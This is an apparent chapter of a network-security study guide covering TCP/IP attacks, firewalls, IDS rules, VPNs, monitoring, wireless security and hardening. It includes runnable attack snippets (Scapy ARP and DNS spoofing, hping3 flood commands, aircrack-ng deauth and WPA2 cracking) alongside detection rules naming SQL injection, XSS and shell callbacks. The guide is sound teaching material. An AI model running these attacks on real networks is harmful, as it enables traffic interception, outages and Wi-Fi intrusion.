# 🌐 Network Security - Complete Deep Dive

## TCP/IP Protocol Security

### TCP Three-Way Handshake
```
Client → SYN → Server
Client ← SYN-ACK ← Server
Client → ACK → Server

Vulnerabilities:
- SYN Flood (DDoS)
- Session Hijacking
- TCP Sequence Prediction
```

### Common Network Attacks

#### 1. Man-in-the-Middle (MITM)
```python
# ARP Spoofing (MITM attack)
from scapy.all import ARP, send
import time

def arp_spoof(target_ip, gateway_ip):
    # Tell target we are the gateway
    target_arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    # Tell gateway we are the target
    gateway_arp = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
    
    while True:
        send(target_arp, verbose=False)
        send(gateway_arp, verbose=False)
        time.sleep(2)

# Defense: Static ARP entries, ARP inspection
```

#### 2. DDoS Attacks
```bash
# SYN Flood
hping3 -S --flood -V -p 80 target.com

# UDP Flood
hping3 --udp --flood -V -p 53 target.com

# Defense: Rate limiting, SYN cookies, CDN
```

#### 3. DNS Attacks
```python
# DNS Spoofing
from scapy.all import DNS, DNSRR, IP, UDP, sniff, send

def dns_spoof(pkt):
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:  # DNS query
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata='attacker_ip'))
        send(spoofed_pkt, verbose=0)

sniff(filter="udp port 53", prn=dns_spoof)

# Defense: DNSSEC, DNS over HTTPS (DoH)
```

---

## Firewalls

### Types of Firewalls

#### 1. Packet Filtering
```bash
# iptables rules
# Block incoming traffic on port 23 (Telnet)
iptables -A INPUT -p tcp --dport 23 -j DROP

# Allow SSH from specific IP
iptables -A INPUT -p tcp -s 192.168.1.100 --dport 22 -j ACCEPT

# Block all other SSH
iptables -A INPUT -p tcp --dport 22 -j DROP

# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Default deny
iptables -P INPUT DROP
```

#### 2. Stateful Firewall
```bash
# Track connection state
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -m conntrack --ctstate NEW -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -m conntrack --ctstate NEW -p tcp --dport 443 -j ACCEPT
iptables -A INPUT -j DROP
```

#### 3. Application Layer Firewall (WAF)
```nginx
# ModSecurity rules
SecRule REQUEST_URI "@contains /admin" \
    "id:1001,phase:1,deny,status:403,msg:'Admin access blocked'"

SecRule ARGS "@rx <script" \
    "id:1002,phase:2,deny,status:403,msg:'XSS attempt detected'"

SecRule REQUEST_BODY "@rx union.*select" \
    "id:1003,phase:2,deny,status:403,msg:'SQL injection detected'"
```

---

## Intrusion Detection/Prevention Systems

### Snort Rules
```bash
# Detect port scan
alert tcp any any -> $HOME_NET any (flags:S; msg:"SYN scan detected"; sid:1000001;)

# Detect SQL injection
alert tcp any any -> $HOME_NET 80 (content:"union"; content:"select"; msg:"SQL injection attempt"; sid:1000002;)

# Detect SSH brute force
alert tcp any any -> $HOME_NET 22 (flags:S; threshold:type both, track by_src, count 5, seconds 60; msg:"SSH brute force"; sid:1000003;)

# Detect malware callback
alert tcp $HOME_NET any -> $EXTERNAL_NET any (content:"cmd.exe"; msg:"Malware callback detected"; sid:1000004;)
```

### OSSEC (Host-based IDS)
```xml
<!-- ossec.conf -->
<rule id="100001" level="10">
  <if_sid>5710</if_sid>
  <match>Failed password</match>
  <description>Multiple failed login attempts</description>
</rule>

<rule id="100002" level="15">
  <if_sid>5503</if_sid>
  <match>sudo</match>
  <description>Sudo command executed</description>
</rule>
```

---

## VPN & Secure Tunneling

### OpenVPN Configuration
```bash
# Server configuration
port 1194
proto udp
dev tun
ca ca.crt
cert server.crt
key server.key
dh dh2048.pem
server 10.8.0.0 255.255.255.0
push "redirect-gateway def1 bypass-dhcp"
cipher AES-256-CBC
auth SHA256
tls-auth ta.key 0

# Client configuration
client
dev tun
proto udp
remote vpn.example.com 1194
ca ca.crt
cert client.crt
key client.key
cipher AES-256-CBC
auth SHA256
tls-auth ta.key 1
```

### SSH Tunneling
```bash
# Local port forwarding
ssh -L 8080:localhost:80 user@remote-server
# Access remote port 80 via localhost:8080

# Dynamic port forwarding (SOCKS proxy)
ssh -D 9050 user@remote-server
# Configure browser to use SOCKS5 proxy localhost:9050

# Remote port forwarding
ssh -R 8080:localhost:80 user@remote-server
# Remote server can access your localhost:80 via its port 8080
```

### WireGuard (Modern VPN)
```ini
# Server config
[Interface]
PrivateKey = server_private_key
Address = 10.0.0.1/24
ListenPort = 51820

[Peer]
PublicKey = client_public_key
AllowedIPs = 10.0.0.2/32

# Client config
[Interface]
PrivateKey = client_private_key
Address = 10.0.0.2/24

[Peer]
PublicKey = server_public_key
Endpoint = vpn.example.com:51820
AllowedIPs = 0.0.0.0/0
PersistentKeepalive = 25
```

---

## Network Monitoring

### Wireshark Filters
```
# HTTP traffic
http

# Specific IP
ip.addr == 192.168.1.1

# TCP SYN packets
tcp.flags.syn == 1 && tcp.flags.ack == 0

# DNS queries
dns.flags.response == 0

# SSL/TLS handshake
ssl.handshake.type == 1

# Follow TCP stream
tcp.stream eq 0

# Suspicious traffic
tcp.port == 4444 || tcp.port == 5555
```

### tcpdump
```bash
# Capture HTTP traffic
tcpdump -i eth0 port 80 -w capture.pcap

# Capture specific host
tcpdump -i eth0 host 192.168.1.1

# Capture SYN packets
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'

# Read pcap file
tcpdump -r capture.pcap

# Display ASCII
tcpdump -A -r capture.pcap
```

### Zeek (Bro) Network Monitor
```zeek
# Detect SSH brute force
event ssh_auth_failed(c: connection)
{
    if (c$ssh$auth_attempts > 5)
        print fmt("SSH brute force from %s", c$id$orig_h);
}

# Detect large file transfers
event file_over_new_connection(f: fa_file, c: connection)
{
    if (f$total_bytes > 100000000)  # 100MB
        print fmt("Large file transfer: %d bytes", f$total_bytes);
}
```

---

## Wireless Security

### WPA2/WPA3 Attacks
```bash
# Capture handshake
airmon-ng start wlan0
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth clients to force reconnection
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack WPA2 password
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture.cap

# Defense: WPA3, strong passwords, disable WPS
```

### Rogue Access Point Detection
```python
from scapy.all import *

known_aps = {'MyNetwork': 'AA:BB:CC:DD:EE:FF'}

def detect_rogue_ap(pkt):
    if pkt.haslayer(Dot11Beacon):
        ssid = pkt[Dot11Elt].info.decode()
        bssid = pkt[Dot11].addr2
        
        if ssid in known_aps and bssid != known_aps[ssid]:
            print(f"Rogue AP detected! SSID: {ssid}, BSSID: {bssid}")

sniff(iface="wlan0mon", prn=detect_rogue_ap)
```

---

## Network Segmentation

### VLAN Configuration
```cisco
# Create VLANs
vlan 10
 name Management
vlan 20
 name Users
vlan 30
 name Servers
vlan 99
 name Guest

# Assign ports to VLANs
interface FastEthernet0/1
 switchport mode access
 switchport access vlan 10

# Trunk port
interface GigabitEthernet0/1
 switchport mode trunk
 switchport trunk allowed vlan 10,20,30
```

### Network Access Control (NAC)
```python
# 802.1X authentication
from pyrad.client import Client
from pyrad.dictionary import Dictionary

srv = Client(server="radius-server", secret=b"shared-secret",
             dict=Dictionary("dictionary"))

req = srv.CreateAuthPacket(code=pyrad.packet.AccessRequest,
                           User_Name="user",
                           NAS_Identifier="switch")
req["User-Password"] = req.PwCrypt("password")

reply = srv.SendPacket(req)
if reply.code == pyrad.packet.AccessAccept:
    print("Access granted")
else:
    print("Access denied")
```

---

## SSL/TLS Security

### SSL/TLS Configuration
```nginx
# Nginx SSL configuration
server {
    listen 443 ssl http2;
    server_name example.com;
    
    # Certificates
    ssl_certificate /etc/ssl/certs/example.com.crt;
    ssl_certificate_key /etc/ssl/private/example.com.key;
    
    # Protocols
    ssl_protocols TLSv1.2 TLSv1.3;
    
    # Ciphers
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
    ssl_prefer_server_ciphers on;
    
    # HSTS
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    
    # OCSP Stapling
    ssl_stapling on;
    ssl_stapling_verify on;
    
    # Session cache
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 10m;
}
```

### SSL/TLS Testing
```bash
# Test SSL/TLS configuration
nmap --script ssl-enum-ciphers -p 443 example.com

# Check certificate
openssl s_client -connect example.com:443 -showcerts

# Test for vulnerabilities
sslscan example.com
testssl.sh example.com
```

---

## Network Hardening

### Linux Network Hardening
```bash
# Disable IP forwarding
echo 0 > /proc/sys/net/ipv4/ip_forward

# Enable SYN cookies
echo 1 > /proc/sys/net/ipv4/tcp_syncookies

# Disable ICMP redirects
echo 0 > /proc/sys/net/ipv4/conf/all/accept_redirects

# Disable source routing
echo 0 > /proc/sys/net/ipv4/conf/all/accept_source_route

# Enable reverse path filtering
echo 1 > /proc/sys/net/ipv4/conf/all/rp_filter

# Log martian packets
echo 1 > /proc/sys/net/ipv4/conf/all/log_martians
```

### Port Knocking
```bash
# knockd configuration
[options]
    UseSyslog

[openSSH]
    sequence    = 7000,8000,9000
    seq_timeout = 5
    command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
    tcpflags    = syn

[closeSSH]
    sequence    = 9000,8000,7000
    seq_timeout = 5
    command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
    tcpflags    = syn

# Client usage
knock server.com 7000 8000 9000
ssh user@server.com
```

---

## Network Forensics

### Packet Analysis
```python
from scapy.all import *

# Analyze pcap file
packets = rdpcap('capture.pcap')

# Extract HTTP requests
for pkt in packets:
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        if pkt[TCP].dport == 80:
            payload = pkt[Raw].load.decode(errors='ignore')
            if 'GET' in payload or 'POST' in payload:
                print(payload.split('\r\n')[0])

# Extract credentials
for pkt in packets:
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        payload = pkt[Raw].load.decode(errors='ignore')
        if 'password' in payload.lower():
            print(f"Potential credential: {payload}")
```

### Network Timeline Analysis
```bash
# Create timeline from pcap
tshark -r capture.pcap -T fields -e frame.time -e ip.src -e ip.dst -e tcp.dstport > timeline.txt

# Analyze connections
tshark -r capture.pcap -q -z conv,tcp

# Extract files
tshark -r capture.pcap --export-objects http,exported_files/
```

---

## Summary

### Network Security Checklist
```
Perimeter Security:
✅ Firewall configured
✅ IDS/IPS deployed
✅ DDoS protection
✅ VPN for remote access

Internal Security:
✅ Network segmentation (VLANs)
✅ NAC implemented
✅ Wireless security (WPA3)
✅ Port security

Monitoring:
✅ Network traffic monitoring
✅ Log aggregation
✅ Anomaly detection
✅ Incident response plan

Hardening:
✅ Disable unnecessary services
✅ Strong encryption (TLS 1.3)
✅ Regular patching
✅ Security audits
```

### Common Ports to Monitor
```
20/21   FTP
22      SSH
23      Telnet (disable!)
25      SMTP
53      DNS
80      HTTP
443     HTTPS
445     SMB
3306    MySQL
3389    RDP
5432    PostgreSQL
```

---

**Next:** [07_Cloud_Security_Complete.md](./07_Cloud_Security_Complete.md)
